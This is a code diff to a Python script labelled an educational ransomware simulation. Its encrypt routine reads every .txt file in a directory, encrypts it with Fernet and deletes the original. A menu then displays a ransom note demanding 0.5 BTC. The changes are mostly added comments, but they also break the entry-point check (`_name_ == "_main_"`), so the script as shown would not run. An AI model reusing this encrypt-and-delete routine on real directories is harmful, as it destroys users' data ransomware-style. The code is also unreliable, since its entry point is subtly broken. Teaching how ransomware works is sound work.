@@ -1,15 +1,25 @@
+#!/usr/bin/env python3
+"""
+Scribble Ransomware Simulation - Simplified Console Version
+Educational Project for Cybersecurity Course
+"""
+
 import os
+import sys
 import time
 import json
+import datetime
 import glob
 from cryptography.fernet import Fernet
 
 def print_header(text):
+    """Print a header with decoration"""
     print("\n" + "=" * 70)
     print(text.center(70))
     print("=" * 70 + "\n")
 
 def create_test_files(directory, num_files=5):
+    """Create test files for demonstration"""
     if not os.path.exists(directory):
         os.makedirs(directory)
     
@@ -25,23 +35,31 @@ def create_test_files(directory, num_files=5):
     return files_created
 
 def encrypt_files(directory):
+    """Encrypt all text files in directory"""
+    # Generate encryption key
     key = Fernet.generate_key()
     cipher = Fernet(key)
     
+    # Find all .txt files
     files = glob.glob(os.path.join(directory, "*.txt"))
     
+    # Encrypt each file
     encrypted_files = []
     for file_path in files:
         try:
+            # Read file
             with open(file_path, "rb") as f:
                 data = f.read()
             
+            # Encrypt data
             encrypted_data = cipher.encrypt(data)
             
+            # Write encrypted data
             encrypted_path = file_path + ".encrypted"
             with open(encrypted_path, "wb") as f:
                 f.write(encrypted_data)
             
+            # Delete original file
             os.remove(file_path)
             
             encrypted_files.append({"original": file_path, "encrypted": encrypted_path})
@@ -50,6 +68,7 @@ def encrypt_files(directory):
         except Exception as e:
             print(f"Error encrypting {file_path}: {e}")
     
+    # Save key and file list
     with open("key.json", "w") as f:
         json.dump({"key": key.decode(), "files": encrypted_files}, f)
     
@@ -57,6 +76,7 @@ def encrypt_files(directory):
 
 def decrypt_files():
     """Decrypt all encrypted files"""
+    # Load key and file list
     try:
         with open("key.json", "r") as f:
             data = json.load(f)
@@ -68,14 +88,18 @@ def decrypt_files():
         
         for file_info in files:
             try:
+                # Read encrypted file
                 with open(file_info["encrypted"], "rb") as f:
                     encrypted_data = f.read()
                 
+                # Decrypt data
                 decrypted_data = cipher.decrypt(encrypted_data)
                 
+                # Write decrypted data
                 with open(file_info["original"], "wb") as f:
                     f.write(decrypted_data)
                 
+                # Delete encrypted file
                 os.remove(file_info["encrypted"])
                 
                 print(f"Decrypted: {file_info['original']}")
@@ -83,6 +107,7 @@ def decrypt_files():
             except Exception as e:
                 print(f"Error decrypting {file_info['encrypted']}: {e}")
         
+        # Delete key file
         os.remove("key.json")
         return len(files)
         
@@ -105,6 +130,7 @@ def delete_files():
             except Exception as e:
                 print(f"Error deleting {file_info['encrypted']}: {e}")
         
+        # Delete key file
         os.remove("key.json")
         return len(files)
         
@@ -139,6 +165,7 @@ def main_menu():
                 num = encrypt_files(test_dir)
                 print(f"\nEncrypted {num} files.")
                 
+                # Display ransom note
                 print_header("YOUR FILES HAVE BEEN ENCRYPTED!")
                 print("All your important files have been encrypted with strong encryption.")
                 print("To recover your files, you must pay 0.5 BTC to the following address:")
@@ -183,7 +210,7 @@ def main_menu():
             print("\nInvalid choice. Please try again.")
             input("\nPress Enter to continue...")
 
-if __name__ == "_main_":
+if _name_ == "_main_":
     print("Starting Scribble Ransomware Simulation...")
     print("WARNING: This is for educational purposes only.")
     main_menu()
